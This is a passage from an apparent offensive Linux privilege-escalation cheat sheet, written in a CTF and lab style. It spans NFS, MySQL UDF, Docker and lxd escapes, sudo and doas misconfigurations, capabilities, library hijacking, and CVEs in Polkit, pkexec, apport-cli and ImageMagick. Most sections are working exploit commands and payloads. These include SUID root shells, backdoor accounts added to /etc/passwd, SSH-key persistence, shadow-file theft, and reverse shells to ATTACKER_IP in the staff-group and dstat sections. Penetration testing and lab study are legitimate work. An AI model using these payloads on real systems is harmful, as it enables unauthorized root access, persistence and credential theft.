* Still using Kali's root user, generate a payload using msfvenom and save it to the mounted share (this payload simply calls /bin/bash):

```
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

* Still using Kali's root user, make the file executable and set the SUID permission:

```
chmod +xs /tmp/nfs/shell.elf
```

* Back on the Debian VM, as the low privileged user account, execute the file to gain a root shell:

```
/tmp/shell.elf
```

#### NFS Method 2

```
cat /etc/exports
Attack Box:
showmount -e 10.10.10.10
mkdir /tmp/nfs
mount -o rw,vers=2 10.10.10.10:/tmp /tmp/nfs
echo 'int main() { setgid(0); setuid(0); system("/bin/bash"); return 0; }' > /tmp/nfs/x.c
gcc /tmp/nfs/x.c -o /tmp/nfs/x
chmod +s /tmp/nfs/x
Target Box:
/tmp/x
id
```

#### NFS Errors

* When we try to mount with the alternative command above, we fail to get any response and connection times out.
* To double check use the command:

```
show mount -e 10.10.185.59
clnt_create: RPC: Unable to recieve
```

* Means there is a share on the host but only reachable on the remote machine locally.
* Can forward the port on our machine to the target machine
* Need to check the ports on the target with:

```
rpcinfo -p
100005    3   udp  20048  mountd
    100005    3   tcp  20048  mountd
    100003    3   tcp   2049  nfs
    100003    4   tcp   2049  nfs
    100227    3   tcp   2049  nfs_acl
```

* Confirms nfs is running on 2049 the default port
* Now port forward:

```
ssh targetusername@10.10.185.59 -i id_rsa -L 2049:localhost:2049
ssh sys-internal@10.10.232.5 -i id_rsa -L 44561:localhost:44561
```

* When a shell on the remote machine authenticates we are successful
* Now create the mount with elevated permissions

```
sudo mkdir /tmp/nfs
sudo mount -v -t nfs localhost:/ /tmp/nfs
```

* Now to get to root
* On your attackbox run

```
cp /bin/bash /tmp/nfs
chmod +s bash
```

* Now on the target box as your non elevated user

```
./bash -p
id
uid=1000(james) gid=1000(james) euid=0(root) egid=0(root)
```

### Service Exploits

* https://www.exploit-db.com/exploits/1518
* The mysql service is running as root and the 'root' user for the service does not have a password assigned or the password is known.
* This exploit takes advantage of the User Defined Functions (UFDs) to run system commands as root via the mysql service.
* Change into the `/home/user/tools/mysql-udf` directory.

```
cd /home/user/tools/mysql-udf
```

* Compile the raptor\_udf2.c exploit code using the following

```
gcc -g -c raptor_udf2.c -fPIC
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc
```

* Connect to the mysql service as the root user with a blank or known password.

```
mysql -u root
```

* Execute the following commands on the mysql shell to create a udf "do\_system" using the compiled exploit

```
use mysql;
create table foo(line blob);
insert into foo values (load_file('/home/user/tools/mysql-udf/raptor_udf2.so'));
select * from foo into dumpfile '/usr/lib/mysql/plugin/raptor_udf2.so';
create function do_system returns integer soname 'raptor_udf2.so';
```

* Use the function to copy /bin/bash to /tmp/rootbash and set the SUID permission

```
select do_system('cp /bin/bash /tmp/rootbash; chmod +xs /tmp/rootbash');
```

* Exit out of the mysql shell

```
\q
```

* Run /tmp/rootbash with -p to gain a root shell `/tmp/rootbash -p`

---

### Staff Group Privilege Escalation (Debian/Devuan)

The `staff` group in Debian-based systems allows users to write to `/usr/local` directories without root privileges. Since `/usr/local/bin` is typically first in PATH, you can hijack commands.

**Detection:**

```bash
# Check if you're in staff group
id
# uid=1000(user) gid=1000(user) groups=...,50(staff)

# Verify writable directories
find /usr/local -type d -group staff -writable 2>/dev/null
```

**Exploitation via run-parts Hijacking:**

When users log in, PAM runs `run-parts` to execute scripts. If `/usr/local/bin` is writable and before `/bin` in PATH:

```bash
# Check PATH order
echo $PATH
# /usr/local/bin:/usr/bin:/bin:...

# Monitor for processes (use pspy)
./pspy64
# Look for: /bin/sh -c /root/bin/cleanup.pl
# Or PAM session scripts calling run-parts
```

**Create malicious run-parts:**

```bash
# Create fake run-parts that adds root user
cat << 'EOF' > /usr/local/bin/run-parts
#!/bin/bash
echo 'pwned:$1$pwned$SjG1dZ5m5g0hB4WC0xJjx/:0:0:root:/root:/bin/bash' >> /etc/passwd
EOF

chmod +x /usr/local/bin/run-parts
```

**Trigger:**

```bash
# Log out and log back in via SSH
exit
ssh user@target

# Check if user was added
cat /etc/passwd | grep pwned

# Switch to root
su pwned
# Password: pwned123
```

**Pre-generated password hashes:**

```bash
# Generate with openssl
openssl passwd -1 -salt pwned pwned123
# $1$pwned$SjG1dZ5m5g0hB4WC0xJjx/

# Or use mkpasswd
mkpasswd -m sha-512 password123
```

**Alternative payloads:**

```bash
# Copy bash with SUID
#!/bin/bash
cp /bin/bash /tmp/rootbash
chmod +s /tmp/rootbash

# Reverse shell
#!/bin/bash
bash -i >& /dev/tcp/ATTACKER_IP/9001 0>&1

# Add SSH key
#!/bin/bash
mkdir -p /root/.ssh
echo "YOUR_PUBLIC_KEY" >> /root/.ssh/authorized_keys
```

---

### Group Writable Config File Privilege Escalation

If you're in a group that can write to config files executed by root (via cron, services, etc.), you can inject code.

**Detection:**

```bash
# Check your groups
id
# uid=1000(albert) gid=1000(albert) groups=1000(albert),1002(management)

# Find files writable by your group
find / -group management -writable 2>/dev/null

# Look for config files, PHP includes, etc.
-rwxrwxr-x 1 root management 49 Nov  5 2024 /opt/website-monitor/config/configuration.php
```

**Identify what executes the file:**

```bash
# Use pspy to monitor processes
./pspy64

# Example output showing cron job:
# CMD: UID=0 PID=37516 | /usr/bin/php -f /opt/website-monitor/monitor.php
```

**Exploitation - PHP Config Include:**

```bash
# Original config
cat /opt/website-monitor/config/configuration.php
<?php
define('PATH', '/opt/website-monitor');
?>

# Inject reverse shell or command execution
cat << 'EOF' > /opt/website-monitor/config/configuration.php
<?php
define('PATH', '/opt/website-monitor');
system('cp /bin/bash /tmp/rootbash; chown root:root /tmp/rootbash; chmod 6777 /tmp/rootbash;');
?>
EOF

# Wait for cron to execute, then:
/tmp/rootbash -p
```

**Alternative - Read sensitive files:**

```php
<?php
define('PATH', '/opt/website-monitor');
$file_contents = file_get_contents('/root/root.txt');
file_put_contents('/tmp/root.txt', $file_contents);
?>
```

**Note:** The file may be reset by automation - act quickly or set up persistence first.

---

### Sudo adduser Privilege Escalation (Ubuntu Admin Group)

On Ubuntu systems with default sudoers configuration, the `admin` group has full sudo privileges. If you can create a new user, create one named `admin` to exploit this.

**Vulnerable sudo rule:**
```
(ALL : ALL) NOPASSWD: /usr/sbin/adduser ^[a-zA-Z0-9]+$
```

**Exploitation:**

By default, `adduser` creates a group with the same name as the user. Creating a user named "admin" puts them in a new group called "admin" which has sudo privileges on default Ubuntu installations.

```bash
# Create user named admin
sudo /usr/sbin/adduser admin
# Set password when prompted

# Switch to admin user
su - admin
Password: [your password]

# Check sudo privileges
sudo -l
# User admin may run the following commands on host:
#     (ALL) ALL

# Get root
sudo su
root@host#
```

**Why this works:**

Ubuntu's default `/etc/sudoers` contains:
```
%admin ALL=(ALL) ALL
```

When you create a user named `admin`, a group named `admin` is also created and the user is added to it. This group matches the default sudoers rule, granting full sudo privileges.

**Note:** This only works if:
1. The default sudoers file hasn't been modified
2. No `admin` user/group already exists
3. You can create users via sudo

---

### doas Privilege Escalation

`doas` is a BSD alternative to sudo. Check for SUID and config.

**Detection:**

```bash
# Find doas binary
find / -type f -name "doas" 2>/dev/null
ls -la /usr/local/bin/doas

# Find config
find / -type f -name "doas*" 2>/dev/null
cat /usr/local/etc/doas.conf
```

**Config format:**

```
permit nopass <user> as root cmd <command>
```

**Exploitation depends on allowed command - check GTFOBins.**

### dstat Plugin Privilege Escalation

If `doas` or `sudo` allows running `dstat`, exploit via custom plugin.

**Detection:**

```bash
# Check doas config
cat /usr/local/etc/doas.conf
# permit nopass player as root cmd /usr/bin/dstat

# Or sudo -l
sudo -l
# (root) NOPASSWD: /usr/bin/dstat
```

**Find plugin directories:**

```bash
find / -type d -name dstat 2>/dev/null
# /usr/share/dstat
# /usr/local/share/dstat
```

**Create malicious plugin:**

```bash
# Plugin must be named dstat_<name>.py
vim /usr/local/share/dstat/dstat_exploit.py
```

```python
import os
os.system('chmod +s /usr/bin/bash')
```

**Execute:**

```bash
# List plugins to verify
dstat --list
# Should show "exploit" in /usr/local/share/dstat

# Run with doas/sudo
doas /usr/bin/dstat --exploit
# or
sudo /usr/bin/dstat --exploit

# Get root shell
bash -p
```

**Alternative plugin payloads:**

```python
# Reverse shell
import os
os.system('bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1')

# Add user to sudoers
import os
os.system('echo "user ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers')

# Copy root's SSH key
import os
os.system('cp /root/.ssh/id_rsa /tmp/rootkey && chmod 644 /tmp/rootkey')
```

**Reference:** https://gtfobins.github.io/gtfobins/dstat/

### Docker Container Detection & Enumeration

**Detect if you're in a container:**

```bash
# Check for .dockerenv file
ls -la /.dockerenv

# Check cgroup
cat /proc/1/cgroup | grep docker

# Hostname is often container ID
hostname
```

**Container Enumeration Tools:**

```bash
# CDK - Container penetration toolkit
wget https://github.com/cdk-team/CDK/releases/download/v1.5.5/cdk_linux_amd64
chmod +x cdk_linux_amd64

# Full evaluation
./cdk_linux_amd64 evaluate --full

# amicontained - Container introspection tool
wget https://github.com/genuinetools/amicontained/releases/download/v0.4.9/amicontained-linux-amd64
chmod +x amicontained-linux-amd64
./amicontained-linux-amd64
```

**Extract credentials from container process environment:**

```bash
# Container processes often have credentials in environment variables
ps -elf
cat /proc/1/environ

# Example output:
# GF_SECURITY_ADMIN_PASSWORD=RioTecRANDEntANT!
# GF_SECURITY_ADMIN_USER=enzo
```

**Capabilities to look for (potential escape):**

```
CAP_SYS_ADMIN, CAP_SYS_PTRACE, CAP_SYS_MODULE, 
DAC_READ_SEARCH, DAC_OVERRIDE, CAP_SYS_RAWIO, 
CAP_SYSLOG, CAP_NET_RAW, CAP_NET_ADMIN
```

**Reference:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/

---

### Docker Linux Local PE

```
id
```

* Check to see if the user is in the docker group

```
docker run hello-world
```

* Check to see if docker is installed and working correctly

```
docker run -v /root:/mnt alpine cat /mnt/key.txt
```

* `-v` specifies a volume to mount, in this case the /root directory on the house was mounted to the /mnt directory on the container. Because docker has SUID we were able to mount a root owned directory in our container

```
docker run -it -v /:/mnt alpine chroot /mnt
```

* Roots the host with docker because we used chroot on the /mnt directory. This allowed us to use the host operating system.

```
docker run -it ubuntu bash
```

* Optional: Run an ubuntu container with docker

### Docker Exec Privilege Escalation

If you can run `sudo docker exec *` on an existing container, use `--privileged` and `--user root` to gain root access and escape to the host.

**Detection:**

```bash
sudo -l
# (root) NOPASSWD: /snap/bin/docker exec *
```

**Find running container ID:**

```bash
# From process list
ps -auxww | grep containerd-shim
# Look for: -id CONTAINER_ID

# Or if you have docker access
docker ps

# First 12 characters usually sufficient
echo "e6ff5b1cbc85cdb2157879161e42a08c1062da655f5a6b7e24488342339d4b81" | head -c 12
# e6ff5b1cbc85
```

**Exploit - Get root shell in container:**

```bash
# The key flags are --privileged and --user root
sudo /snap/bin/docker exec --privileged --user root -it CONTAINER_ID /bin/sh

# Verify root access
id
# uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon)...
```

**Escape to host filesystem:**

```bash
# Find host disk
fdisk -l
# /dev/sda1 - Linux filesystem

# Mount host disk
mkdir /tmp/host
mount /dev/sda1 /tmp/host

# Access host as root
ls -la /tmp/host/root/
cat /tmp/host/root/root.txt

# Persistence - add SSH key
echo "ssh-ed25519 AAAA... attacker@kali" >> /tmp/host/root/.ssh/authorized_keys

# Or modify /etc/passwd on host
echo "backdoor:$(openssl passwd password123):0:0::/root:/bin/bash" >> /tmp/host/etc/passwd
```

**One-liner:**

```bash
sudo docker exec --privileged --user root -it $(docker ps -q | head -1) sh -c 'mkdir /mnt/host; mount /dev/sda1 /mnt/host; cat /mnt/host/root/root.txt'
```

### lxd Group Priv Esc

* The best example of how to do this&#x20;

[https://0xdf.gitlab.io/2020/11/07/htb-tabby.html](https://0xdf.gitlab.io/2020/11/07/htb-tabby.html)&#x20;

* Exploit without internet connection
* Change to the root user on attack box

```
sudo su
```

* Install Requirements on your attack box

```
sudo apt update
sudo apt install -y golang-go debootstrap rsync gpg squashfs-tools
```

* Clone the repo (attack box)

```
sudo go get -d -v github.com/lxc/distrobuilder
```

* Make distrobuilder (attack box)

```
cd $HOME/go/src/github.com/lxc/distrobuilder
make
```

* Prepare the creation of Alpine (attack box)

```
mkdir -p $HOME/ContainerImages/alpine/
cd $HOME/ContainerImages/alpine/
wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml
```

* Create the container (attack box)

```
sudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml
```

\-If that fails, run it adding `-o image.release=3.8` at the end

* Upload `lxd.tar.xz` and `rootfs.squashfs` to the vulnerable server
* Add the image on the vulnerable server

```
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc image list
```

* Second command is only if you want to confim the imported image is present
* Create a container and add the root path

```
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
```

* Execute the container

```
lxc start privesc
lxc exec privesc /bin/sh
cd /mnt/root
```

* `/mnt/root` is where the file system is mounted.

**Errors-on the vulnerable server**

* If you recieve an `Failed container creation: No storage pool found. Please create a new storage pool.`
* You need to initialize lxd before using it

```
lxd init
```

* Read the options and use the defaults

### Capabilities

* Search your whole file-system recursively with the following command:

```
getcap -r / 2>/dev/null
```

#### Python

* Looking for:

```
/home/demo/python3 = cap_setuid+ep
```

* Escalate Privlages

```
./python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

#### Perl

* Check for Perl:

```
which perl
```

* Looking for:

```
/home/demo/python3 = cap_setuid+ep
```

* Escalate

```
./perl -e 'use POSIX (setuid); POSIX::setuid(0); exec "/bin/bash";'
```

#### Tar

* Check for tar:

```
which tar
```

* Looking For:

```
/home/demo/tar = cap dac read search+ep
```

* Tar the shadow:

```
./tar cvf shadow.tar /etc/shadow
```

* Untar to review:

```
./tar -xvf shadow.tar
```

## Python Library Hijacking

* <img src="https://user-images.githubusercontent.com/75596877/170289480-53b814c0-636e-43bd-a0aa-156887408305.PNG" alt="setenv" data-size="original">
* From `sudo -l` output we see `SETENV` (means we can set the env variables when it is run as root) in addition to the python script that can be run as root
* <img src="https://user-images.githubusercontent.com/75596877/170289844-1d33fa11-e247-4004-8e04-e66668d03e80.PNG" alt="hashlib" data-size="original">
* We see the `import hashlib` statement at the top, can hijack the library
* Python will look in the current directory or a specified path that we list due to the `SETENV` permission.
* The paths that come configured out of the box on Ubuntu 16.04, in order of priority, are:
* Directory of the script being executed

```
/usr/lib/python2.7
/usr/lib/python2.7/plat-x86_64-linux-gnu
/usr/lib/python2.7/lib-tk
/usr/lib/python2.7/lib-old
/usr/lib/python2.7/lib-dynload
/usr/local/lib/python2.7/dist-packages
/usr/lib/python2.7/dist-packages
```

* For other distributions, run the command below to get an ordered list of directories:

```
python -c 'import sys; print "\n".join(sys.path)'
```

* Can also use `locate hashlib.py` to figure out where the library is being executed from
* Once the libary is located
* Copy the `hashlib.py` file to `/tmp or /dev/shm`
* Can either try adding a python reverse shell to the file or:

```
python -c 'import os; os.system("/bin/sh")'
python3 -c 'import os; os.system("/bin/sh")'
```

* To conduct the priv esc now run:

```
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /home/hazel/hasher.py
```

### Manual Polkit Priv Esc Checks

* POC:&#x20;
* [https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation](https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation)
* Target needs to have `accountservice` and `gnome-control-center` installed&#x20;

```
#centos/fed/rhel
rpm -qa accountservice
rpm -qa gnome-control-center
#deb/ubu
dpkg -l | grep accountservice
dpkg -l | grep gnome-control-center
```

* Must have `polkit` version 0.113 or later OR `0-105-26` (Debian fork of `polkit`
* Works with `Ubuntu 20.04` and `Centos 8`, `RHEL 8`, `Fedora 21`, `Debian Bullseye`

```
cat /etc/os-release
```

* Usually need to run the POC multiple times
* For exploitation dispite checks saying not vulnerable: `./polkit.sh -f=y`
* If run with no options, user `secnigma` will be added to `/etc/passwd` and the password for that user is `secnigmaftw`
* To get your root shell `su - secnigma`
* Enter password
* `sudo bash`
* Profit

Universal RCE deserialization gadget chain for Ruby 2.x.

* This works for both `YAML.load` and `Marshal.load`
* [https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)
* See Ruby script using this syntax on a seperate local file that you cannot write to however if the first script is executing through cron or `sudo -l` permissions you can create another file with the same name that the origional is calling i.e. `dependencies.yml`
* Payload:

```
--- !ruby/object:Gem::Requirement
requirements:
  !ruby/object:Gem::DependencyList
  specs:
  - !ruby/object:Gem::Source::SpecificFile
    spec: &1 !ruby/object:Gem::StubSpecification
      loaded_from: "|id 1>&2"
  - !ruby/object:Gem::Source::SpecificFile
      spec:
```

### MOTD Hijacking&#x20;

* Detection:
* Can see root processes like cron jobs without root permissions with `pspy`&#x20;

```
2023/04/06 18:00:01 CMD: UID=0     PID=1087   | /bin/cp /var/backups/.update-motd.d/00-header 
2023/04/06 18:00:01 CMD: UID=0     PID=1083   | /usr/sbin/CRON -f
```

* look for the `motd` to be owned by root but set to a group that we are in, can echo:

```
echo "cp /bin/bash /home/sysadmin/bash && chmod u+s /home/sysadmin/bash" >> 00-header
```

* now log out and re-ssh in to kick it off and then execute bash with `bash -p`

### CVE-2023-1326 - apport-cli Privilege Escalation

`apport-cli` uses `less` as a pager which allows command execution when run with sudo.

**Detection:**

```bash
sudo -l
# (ALL : ALL) /usr/bin/apport-cli
```

**Vulnerable versions:** apport-cli 2.26.0 and earlier

**Exploitation:**

```bash
# 1. Create a crash file (if none exists)
sleep 9999 &
kill -SEGV $!

# 2. Verify crash file created
ls -la /var/crash/
# -rw-r----- 1 user user 33073 ... _usr_bin_sleep.1000.crash

# 3. Run apport-cli with sudo
sudo /usr/bin/apport-cli -c /var/crash/_usr_bin_sleep.1000.crash

# 4. When prompted, press 'V' to view report (opens less pager)
# 5. In less, type:
!/bin/bash

# 6. Root shell spawns
```

**Alternative - use existing crash:**

```bash
# Find existing crash files
find / -type f -name "*.crash" 2>/dev/null

# Use any crash file
sudo /usr/bin/apport-cli -c /var/crash/existing.crash
```

**Reference:** https://github.com/diego-tella/CVE-2023-1326-PoC

### Pkexec as SUID

```
-rwsr-xr-x 1 root root 22K Mar 27  2019 /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/rhel_6(CVE-2011-1485)
# link
https://github.com/Almorabea/pkexec-exploit/blob/main/CVE-2021-4034.py

python3 pwn.py 
Do you want to choose a custom payload? y/n (n use default payload)  n
[+] Cleaning pervious exploiting attempt (if exist)
[+] Creating shared library for exploit code.
[+] Finding a libc library to call execve
[+] Found a library at <CDLL 'libc.so.6', handle 7f83d3d88000 at 0x7f83d3c166a0>
[+] Call execve() with chosen payload
[+] Enjoy your root shell
# id
uid=0(root) gid=1001(julian) groups=1001(julian)
# 
```

### npbackup-cli Privilege Escalation (Pre-Exec Command Injection)

If you can run `npbackup-cli` with sudo and supply a custom config file, you can inject commands via `pre_exec_commands`.

**Detection:**

```bash
sudo -l
# (ALL : ALL) NOPASSWD: /usr/local/bin/npbackup-cli
```

**Exploitation:**

```bash
# 1. Copy existing config (or create new one)
cp /home/user/npbackup.conf /tmp/npbackup.conf

# 2. Edit config - add pre_exec_commands under backup_opts
vim /tmp/npbackup.conf
```

Add malicious command to config:

```yaml
groups:
  default_group:
    backup_opts:
      pre_exec_commands: ["chmod +s /bin/bash"]
      pre_exec_per_command_timeout: 3600
      pre_exec_failure_is_fatal: false
```

Or to read root flag directly:

```yaml
      pre_exec_commands: ["cat /root/root.txt > /tmp/root.txt"]
```

**Execute with custom config:**

```bash
# Run backup with your malicious config (-f forces backup even if recent)
sudo /usr/local/bin/npbackup-cli -c /tmp/npbackup.conf -b -f

# Output shows command execution:
# Pre-execution of command chmod +s /bin/bash succeeded with:
# None

# Get root shell
bash -p
# uid=1000(user) gid=1000(user) euid=0(root) egid=0(root)
```

**Key flags:**
- `-c CONFIG_FILE` - Use custom config file
- `-b` - Run backup (triggers pre_exec_commands)
- `-f` - Force backup even if recent backup exists

### ImageMagick CVE-2024-41817 - Arbitrary Code Execution

ImageMagick versions <= 7.1.1-35 are vulnerable to arbitrary code execution via malicious XML delegation when run from a directory containing attacker-controlled files.

**Detection:**

```bash
/usr/bin/magick -version
# Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64
```

**Vulnerability:** ImageMagick uses empty path in `MAGICK_CONFIGURE_PATH` and `LD_LIBRARY_PATH`, loading config/libraries from current working directory.

**Exploitation:**

1. Create malicious shared library:

```bash
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor)) void init(){
    system("chmod +s /bin/bash");
    exit(0);
}
EOF
```

2. Create malicious delegates.xml (optional, for command execution):

```xml
<delegatemap>
  <delegate xmlns="" decode="XML" command="chmod +s /bin/bash"/>
</delegatemap>
```

3. Place files where ImageMagick will be executed (e.g., cron job directory):

```bash
# Example: cron runs "magick identify" on images in /opt/app/images/
cp libxcb.so.1 /opt/app/images/
cp delegates.xml /opt/app/images/
```

4. Wait for cron execution or trigger manually, then:

```bash
/bin/bash -p
# euid=0(root)
```

**Important:** Library MUST be named `libxcb.so.1` (not `libxcb.so`).

**Reference:** https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8

---

### pspy Limitations - hidepid Mount Option

If pspy cannot see root processes, check if `/proc` is mounted with `hidepid`:

```bash
mount | grep "/proc "
# proc on /proc type proc (rw,nosuid,nodev,noexec,relatime,hidepid=invisible)
```

When `hidepid=invisible` is set, users can only see their own processes. In this case:
- pspy will NOT show root cron jobs
- Must manually search for scheduled tasks:

```bash
# Find shell scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "/usr/src"

# Check crontabs
cat /etc/crontab
ls -la /etc/cron.d/
cat /var/spool/cron/crontabs/*

# Check systemd timers
systemctl list-timers --all
```

---

### Crontab-UI Privilege Escalation

Crontab-UI is a web-based cron job manager. If running as root, you can create privileged cron jobs.

**Discovery:**

```bash
# Default port: 8000 (localhost only)
ss -antpu | grep 8000

# Check for service
systemctl status crontab-ui.service

# LinPEAS detection:
# ═╣ crontab-ui binary found at: /usr/bin/crontab-ui
# Service: crontab-ui.service (state: active, User: root)
#   └─ Basic-Auth credentials in Environment: user='root' pwd='P4ssw0rdS0pRi0T3c'
```

**Credential Locations:**

```bash
# Service file (may contain creds in Environment)
/etc/systemd/system/crontab-ui.service

# Database (JSON format, may have passwords in commands)
/opt/crontabs/crontab.db
cat /opt/crontabs/crontab.db
# Look for: zip -P PASSWORD ...
```

**Access via SSH Tunnel:**

```bash
ssh user@TARGET -L 1234:127.0.0.1:8000
# Browse to http://127.0.0.1:1234
```

**Exploitation:**

1. Access crontab-ui via SSH tunnel
2. Create new cron job:
   - **Command:** `cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell`
   - **Schedule:** `* * * * *`
3. Save and wait for execution:

```bash
ls -la /tmp/rootshell
# -rwsrwsrwx 1 root root ... /tmp/rootshell

/tmp/rootshell -p
# euid=0(root) egid=0(root)
```

**Reference:** https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#scheduledcron-jobs
